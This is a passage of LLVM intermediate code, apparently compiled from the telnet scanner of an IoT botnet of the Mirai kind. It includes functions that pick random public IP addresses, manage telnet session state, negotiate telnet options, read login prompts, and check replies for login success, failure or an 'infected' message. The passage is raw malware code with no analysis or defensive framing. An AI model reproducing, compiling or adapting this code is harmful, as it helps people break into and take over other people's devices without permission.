  %25 = icmp sgt i64 %5, %indvars.iv.next.1
  br i1 %25, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %23, %.lr.ph.1 ], [ %24, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %26 = sext i32 %.1.lcssa.1 to i64
  %27 = sub nsw i64 0, %26
  %28 = getelementptr inbounds i8, i8* %4, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 62
  br i1 %30, label %19, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %31 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %31, label %.lr.ph.2.preheader, label %.critedge.2

.lr.ph.2.preheader:                               ; preds = %.preheader.238
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.lr.ph.2.preheader, %.critedge1.2
  %indvars.iv.2 = phi i64 [ %indvars.iv.next.2, %.critedge1.2 ], [ %26, %.lr.ph.2.preheader ]
  %.130.2 = phi i32 [ %36, %.critedge1.2 ], [ %.1.lcssa.1, %.lr.ph.2.preheader ]
  %32 = sub nsw i64 0, %indvars.iv.2
  %33 = getelementptr inbounds i8, i8* %4, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = trunc i64 %indvars.iv.2 to i32
  switch i8 %34, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %36 = add nsw i32 %.130.2, 1
  %37 = icmp sgt i64 %5, %indvars.iv.next.2
  br i1 %37, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %35, %.lr.ph.2 ], [ %36, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %38 = sext i32 %.1.lcssa.2 to i64
  %39 = sub nsw i64 0, %38
  %40 = getelementptr inbounds i8, i8* %4, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = icmp eq i8 %41, 37
  br i1 %42, label %19, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %43 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %43, label %.lr.ph.3.preheader, label %.critedge.3

.lr.ph.3.preheader:                               ; preds = %.preheader.339
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.lr.ph.3.preheader, %.critedge1.3
  %indvars.iv.3 = phi i64 [ %indvars.iv.next.3, %.critedge1.3 ], [ %38, %.lr.ph.3.preheader ]
  %.130.3 = phi i32 [ %48, %.critedge1.3 ], [ %.1.lcssa.2, %.lr.ph.3.preheader ]
  %44 = sub nsw i64 0, %indvars.iv.3
  %45 = getelementptr inbounds i8, i8* %4, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = trunc i64 %indvars.iv.3 to i32
  switch i8 %46, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %48 = add nsw i32 %.130.3, 1
  %49 = icmp sgt i64 %5, %indvars.iv.next.3
  br i1 %49, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %47, %.lr.ph.3 ], [ %48, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %50 = sext i32 %.1.lcssa.3 to i64
  %51 = sub nsw i64 0, %50
  %52 = getelementptr inbounds i8, i8* %4, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = icmp eq i8 %53, 36
  br i1 %54, label %19, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %55 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %55, label %.lr.ph.4.preheader, label %.critedge.4

.lr.ph.4.preheader:                               ; preds = %.preheader.440
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.lr.ph.4.preheader, %.critedge1.4
  %indvars.iv.4 = phi i64 [ %indvars.iv.next.4, %.critedge1.4 ], [ %50, %.lr.ph.4.preheader ]
  %.130.4 = phi i32 [ %60, %.critedge1.4 ], [ %.1.lcssa.3, %.lr.ph.4.preheader ]
  %56 = sub nsw i64 0, %indvars.iv.4
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = trunc i64 %indvars.iv.4 to i32
  switch i8 %58, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %60 = add nsw i32 %.130.4, 1
  %61 = icmp sgt i64 %5, %indvars.iv.next.4
  br i1 %61, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %59, %.lr.ph.4 ], [ %60, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %62 = sext i32 %.1.lcssa.4 to i64
  %63 = sub nsw i64 0, %62
  %64 = getelementptr inbounds i8, i8* %4, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = icmp eq i8 %65, 35
  %. = zext i1 %66 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #5
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 512, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t* nocapture) local_unnamed_addr #1 {
  tail call void @advance_state(%struct.telstate_t* %0, i32 0)
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 3
  store i8 1, i8* %2, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_success(i8* %0)
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %1
  %5 = tail call i32 @contains_fail(i8* %0)
  %6 = icmp ne i32 %5, 0
  br label %7

; <label>:7:                                      ; preds = %1, %4
  %8 = phi i1 [ true, %1 ], [ %6, %4 ]
  %9 = zext i1 %8 to i32
  ret i32 %9
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_infectmessage(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infected, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  %26 = icmp sgt i32 %3, 0
  %27 = icmp sgt i32 %4, 0
  %28 = or i1 %26, %27
  br i1 %28, label %.lr.ph50.preheader, label %.critedge

.lr.ph50.preheader:                               ; preds = %.lr.ph
  br label %.lr.ph50

.lr.ph50:                                         ; preds = %.lr.ph50.preheader, %.backedge._crit_edge
  %.0333549 = phi i32 [ %40, %.backedge._crit_edge ], [ %7, %.lr.ph50.preheader ]
  %29 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #5, !srcloc !16
  %30 = load i64, i64* %23, align 8
  %31 = or i64 %30, %20
  store i64 %31, i64* %23, align 8
  %32 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #5
  %33 = icmp slt i32 %32, 1
  br i1 %33, label %.critedge.loopexit, label %34

; <label>:34:                                     ; preds = %.lr.ph50
  %35 = sext i32 %.0333549 to i64
  %36 = getelementptr inbounds i8, i8* %5, i64 %35
  %37 = call i64 @recv(i32 %0, i8* %36, i64 1, i32 0) #5
  %38 = trunc i64 %37 to i32
  switch i32 %38, label %39 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:39:                                     ; preds = %34
  %40 = add nsw i32 %38, %.0333549
  %41 = load i8, i8* %36, align 1
  %42 = icmp eq i8 %41, -1
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %39
  %44 = getelementptr inbounds i8, i8* %36, i64 1
  %45 = call i64 @recv(i32 %0, i8* %44, i64 2, i32 0) #5
  %46 = trunc i64 %45 to i32
  switch i32 %46, label %47 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:47:                                     ; preds = %43
  %48 = call i32 @negotiate(i32 %0, i8* nonnull %36, i32 undef)
  br label %.critedge

; <label>:49:                                     ; preds = %39
  %50 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %51 = icmp eq i8* %50, null
  br i1 %51, label %52, label %.critedge.loopexit

; <label>:52:                                     ; preds = %49
  br i1 %25, label %.backedge, label %58

.backedge:                                        ; preds = %52, %58
  %53 = add nsw i32 %40, 2
  %54 = icmp slt i32 %53, %6
  br i1 %54, label %.backedge._crit_edge, label %.critedge.loopexit

.backedge._crit_edge:                             ; preds = %.backedge
  %.pre = load i64, i64* %12, align 8
  %.pre48 = load i64, i64* %14, align 8
  %55 = icmp sgt i64 %.pre, 0
  %56 = icmp sgt i64 %.pre48, 0
  %57 = or i1 %55, %56
  br i1 %57, label %.lr.ph50, label %.critedge.loopexit

; <label>:58:                                     ; preds = %52
  %59 = call i32 @matchPrompt(i8* nonnull %5)
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %34, %34, %49, %58, %.lr.ph50, %.backedge._crit_edge, %.backedge
  %.0.ph = phi i32 [ 0, %34 ], [ 0, %34 ], [ 1, %49 ], [ 1, %58 ], [ 0, %.lr.ph50 ], [ 0, %.backedge._crit_edge ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.lr.ph, %8, %43, %43, %47
  %.0 = phi i32 [ 0, %47 ], [ 0, %43 ], [ 0, %43 ], [ 0, %8 ], [ 0, %.lr.ph ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  store i8 0, i8* @ipState.2, align 1
  store i8 0, i8* @ipState.3, align 1
  %2 = tail call i32 @rand() #5
  %3 = tail call i32 @rand() #5
  %4 = srem i32 %3, 255
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* @ipState.2, align 1
  %6 = tail call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* @ipState.3, align 1
  %9 = tail call i32 @rand() #5
  %10 = tail call i32 @rand() #5
  %11 = srem i32 %10, 152
  switch i32 %11, label %..thread272_crit_edge [
    i32 0, label %36
    i32 1, label %43
    i32 2, label %50
    i32 3, label %57
    i32 4, label %64
    i32 5, label %71
    i32 6, label %78
    i32 7, label %85
    i32 8, label %92
    i32 9, label %99
    i32 10, label %106
    i32 11, label %113
    i32 12, label %120
    i32 13, label %127
    i32 14, label %134
    i32 15, label %141
    i32 16, label %148
    i32 17, label %155
    i32 18, label %162
    i32 19, label %169
    i32 20, label %176
    i32 21, label %183
    i32 22, label %190
    i32 23, label %197
    i32 24, label %204
    i32 25, label %211
    i32 26, label %218
    i32 27, label %.thread164
    i32 28, label %.thread165
    i32 29, label %225
    i32 30, label %.thread168
    i32 31, label %.thread169
    i32 32, label %232
    i32 33, label %239
    i32 34, label %.critedge
    i32 35, label %.thread173
    i32 36, label %.thread175
    i32 37, label %.thread177
    i32 38, label %.thread179
    i32 39, label %.thread181
    i32 40, label %.thread183
    i32 41, label %.thread185
    i32 42, label %.thread187
    i32 43, label %.thread189
    i32 44, label %.thread191
    i32 45, label %.thread193
    i32 46, label %.thread195
    i32 47, label %.thread197
    i32 48, label %.thread199
    i32 49, label %.thread201
    i32 50, label %.thread203
    i32 51, label %.thread205
    i32 52, label %.thread207
    i32 53, label %.thread209
    i32 54, label %.thread211
    i32 55, label %.thread213
    i32 56, label %383
    i32 57, label %390
    i32 58, label %397
    i32 59, label %404
    i32 60, label %411
    i32 61, label %418
    i32 62, label %.thread227
    i32 63, label %.thread229
    i32 64, label %437
    i32 65, label %.thread233
    i32 66, label %.thread235
    i32 67, label %.thread237
    i32 68, label %.thread239
    i32 69, label %.thread241
    i32 70, label %474
    i32 71, label %.thread245
    i32 72, label %487
    i32 73, label %.thread249
    i32 74, label %500
    i32 75, label %507
    i32 76, label %514
    i32 77, label %635
    i32 78, label %.thread258
    i32 79, label %642
    i32 80, label %.thread261
    i32 81, label %.thread262
    i32 82, label %.thread265
    i32 83, label %.thread266
    i32 84, label %.thread267
    i32 85, label %655
    i32 86, label %.thread270
    i32 87, label %662
    i32 88, label %.thread273
    i32 89, label %669
    i32 90, label %676
    i32 91, label %.thread282
    i32 92, label %689
    i32 93, label %696
    i32 94, label %.thread289
    i32 95, label %.thread290
    i32 96, label %.thread291
    i32 97, label %.thread292
    i32 98, label %.thread293
    i32 99, label %.thread294
    i32 100, label %703
    i32 101, label %710
    i32 102, label %717
    i32 103, label %724
    i32 104, label %731
    i32 105, label %.thread307
    i32 106, label %.thread308
    i32 107, label %.thread309
    i32 108, label %.thread310
    i32 109, label %.thread311
    i32 110, label %738
    i32 111, label %745
    i32 112, label %752
    i32 113, label %759
    i32 114, label %.thread320
    i32 115, label %.thread323
    i32 116, label %.thread324
    i32 117, label %.thread327
    i32 118, label %.thread330
    i32 119, label %796
    i32 120, label %.thread333
    i32 121, label %.thread334
    i32 122, label %.thread336
    i32 123, label %.thread338
    i32 124, label %821
    i32 125, label %.thread344
    i32 126, label %834
    i32 127, label %841
    i32 128, label %.thread349
    i32 129, label %854
    i32 130, label %.thread355
    i32 131, label %.thread357
    i32 132, label %.thread358
    i32 133, label %.thread360
    i32 134, label %885
    i32 135, label %892
    i32 136, label %.thread368
    i32 137, label %905
    i32 138, label %.thread372
    i32 139, label %.thread374
    i32 140, label %924
    i32 141, label %931
    i32 142, label %938
    i32 143, label %.thread385
    i32 144, label %.thread389
    i32 145, label %957
    i32 146, label %.thread393
    i32 147, label %970
    i32 148, label %.thread397
    i32 149, label %983
    i32 150, label %990
    i32 151, label %997
  ]

..thread272_crit_edge:                            ; preds = %0
  %.pre = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  br label %.thread272

.thread169:                                       ; preds = %0
  %12 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %13 = load i8, i8* @ipState.2, align 1
  %14 = zext i8 %13 to i32
  %15 = load i8, i8* @ipState.3, align 1
  %16 = zext i8 %15 to i32
  %17 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %12, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.72, i64 0, i64 0), i32 %14, i32 %16)
  br label %.thread272

.thread168:                                       ; preds = %0
  %18 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %19 = load i8, i8* @ipState.2, align 1
  %20 = zext i8 %19 to i32
  %21 = load i8, i8* @ipState.3, align 1
  %22 = zext i8 %21 to i32
  %23 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %18, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.71, i64 0, i64 0), i32 %20, i32 %22)
  br label %.thread272

.thread165:                                       ; preds = %0
  %24 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %25 = load i8, i8* @ipState.2, align 1
  %26 = zext i8 %25 to i32
  %27 = load i8, i8* @ipState.3, align 1
  %28 = zext i8 %27 to i32
  %29 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %24, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i64 0, i64 0), i32 %26, i32 %28)
  br label %.thread272

.thread164:                                       ; preds = %0
  %30 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %31 = load i8, i8* @ipState.2, align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* @ipState.3, align 1
  %34 = zext i8 %33 to i32
  %35 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %30, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0), i32 %32, i32 %34)
  br label %.thread272

; <label>:36:                                     ; preds = %0
  %37 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %38 = load i8, i8* @ipState.2, align 1
  %39 = zext i8 %38 to i32
  %40 = load i8, i8* @ipState.3, align 1
  %41 = zext i8 %40 to i32
  %42 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %37, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.42, i64 0, i64 0), i32 %39, i32 %41)
  br label %.thread272

; <label>:43:                                     ; preds = %0
  %44 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %45 = load i8, i8* @ipState.2, align 1
  %46 = zext i8 %45 to i32
  %47 = load i8, i8* @ipState.3, align 1
  %48 = zext i8 %47 to i32
  %49 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %44, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i64 0, i64 0), i32 %46, i32 %48)
  br label %.thread272

; <label>:50:                                     ; preds = %0
  %51 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %52 = load i8, i8* @ipState.2, align 1
  %53 = zext i8 %52 to i32
  %54 = load i8, i8* @ipState.3, align 1
  %55 = zext i8 %54 to i32
  %56 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %51, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i64 0, i64 0), i32 %53, i32 %55)
  br label %.thread272

; <label>:57:                                     ; preds = %0
  %58 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %59 = load i8, i8* @ipState.2, align 1
  %60 = zext i8 %59 to i32
  %61 = load i8, i8* @ipState.3, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %58, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.45, i64 0, i64 0), i32 %60, i32 %62)
  br label %.thread272

; <label>:64:                                     ; preds = %0
  %65 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %66 = load i8, i8* @ipState.2, align 1
  %67 = zext i8 %66 to i32
  %68 = load i8, i8* @ipState.3, align 1
  %69 = zext i8 %68 to i32
  %70 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %65, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.46, i64 0, i64 0), i32 %67, i32 %69)
  br label %.thread272

; <label>:71:                                     ; preds = %0
  %72 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %73 = load i8, i8* @ipState.2, align 1
  %74 = zext i8 %73 to i32
  %75 = load i8, i8* @ipState.3, align 1
  %76 = zext i8 %75 to i32
  %77 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %72, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.47, i64 0, i64 0), i32 %74, i32 %76)
  br label %.thread272

; <label>:78:                                     ; preds = %0
  %79 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %80 = load i8, i8* @ipState.2, align 1
  %81 = zext i8 %80 to i32
  %82 = load i8, i8* @ipState.3, align 1
  %83 = zext i8 %82 to i32
  %84 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %79, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.48, i64 0, i64 0), i32 %81, i32 %83)
  br label %.thread272

; <label>:85:                                     ; preds = %0
  %86 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %87 = load i8, i8* @ipState.2, align 1
  %88 = zext i8 %87 to i32
  %89 = load i8, i8* @ipState.3, align 1
  %90 = zext i8 %89 to i32
  %91 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %86, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i64 0, i64 0), i32 %88, i32 %90)
  br label %.thread272

; <label>:92:                                     ; preds = %0
  %93 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %94 = load i8, i8* @ipState.2, align 1
  %95 = zext i8 %94 to i32
  %96 = load i8, i8* @ipState.3, align 1
  %97 = zext i8 %96 to i32
  %98 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %93, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.50, i64 0, i64 0), i32 %95, i32 %97)
  br label %.thread272

; <label>:99:                                     ; preds = %0
  %100 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %101 = load i8, i8* @ipState.2, align 1
  %102 = zext i8 %101 to i32
  %103 = load i8, i8* @ipState.3, align 1
  %104 = zext i8 %103 to i32
  %105 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %100, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.51, i64 0, i64 0), i32 %102, i32 %104)
  br label %.thread272

; <label>:106:                                    ; preds = %0
  %107 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %108 = load i8, i8* @ipState.2, align 1
  %109 = zext i8 %108 to i32
  %110 = load i8, i8* @ipState.3, align 1
  %111 = zext i8 %110 to i32
  %112 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %107, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i64 0, i64 0), i32 %109, i32 %111)
  br label %.thread272

; <label>:113:                                    ; preds = %0
  %114 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %115 = load i8, i8* @ipState.2, align 1
  %116 = zext i8 %115 to i32
  %117 = load i8, i8* @ipState.3, align 1
  %118 = zext i8 %117 to i32
  %119 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %114, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.53, i64 0, i64 0), i32 %116, i32 %118)
  br label %.thread272

; <label>:120:                                    ; preds = %0
  %121 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %122 = load i8, i8* @ipState.2, align 1
  %123 = zext i8 %122 to i32
  %124 = load i8, i8* @ipState.3, align 1
  %125 = zext i8 %124 to i32
  %126 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %121, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.54, i64 0, i64 0), i32 %123, i32 %125)
  br label %.thread272

; <label>:127:                                    ; preds = %0
  %128 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %129 = load i8, i8* @ipState.2, align 1
  %130 = zext i8 %129 to i32
  %131 = load i8, i8* @ipState.3, align 1
  %132 = zext i8 %131 to i32
  %133 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %128, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.55, i64 0, i64 0), i32 %130, i32 %132)
  br label %.thread272

; <label>:134:                                    ; preds = %0
  %135 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %136 = load i8, i8* @ipState.2, align 1
  %137 = zext i8 %136 to i32
  %138 = load i8, i8* @ipState.3, align 1
  %139 = zext i8 %138 to i32
  %140 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %135, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.56, i64 0, i64 0), i32 %137, i32 %139)
  br label %.thread272

; <label>:141:                                    ; preds = %0
  %142 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %143 = load i8, i8* @ipState.2, align 1
  %144 = zext i8 %143 to i32
  %145 = load i8, i8* @ipState.3, align 1
  %146 = zext i8 %145 to i32
  %147 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %142, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i64 0, i64 0), i32 %144, i32 %146)
  br label %.thread272

; <label>:148:                                    ; preds = %0
  %149 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %150 = load i8, i8* @ipState.2, align 1
  %151 = zext i8 %150 to i32
  %152 = load i8, i8* @ipState.3, align 1
  %153 = zext i8 %152 to i32
  %154 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %149, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i64 0, i64 0), i32 %151, i32 %153)
  br label %.thread272

; <label>:155:                                    ; preds = %0
  %156 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %157 = load i8, i8* @ipState.2, align 1
  %158 = zext i8 %157 to i32
  %159 = load i8, i8* @ipState.3, align 1
  %160 = zext i8 %159 to i32
  %161 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %156, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.59, i64 0, i64 0), i32 %158, i32 %160)
  br label %.thread272

; <label>:162:                                    ; preds = %0
  %163 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %164 = load i8, i8* @ipState.2, align 1
  %165 = zext i8 %164 to i32
  %166 = load i8, i8* @ipState.3, align 1
  %167 = zext i8 %166 to i32
  %168 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %163, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.60, i64 0, i64 0), i32 %165, i32 %167)
  br label %.thread272

; <label>:169:                                    ; preds = %0
  %170 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  %171 = load i8, i8* @ipState.2, align 1
  %172 = zext i8 %171 to i32
  %173 = load i8, i8* @ipState.3, align 1
  %174 = zext i8 %173 to i32
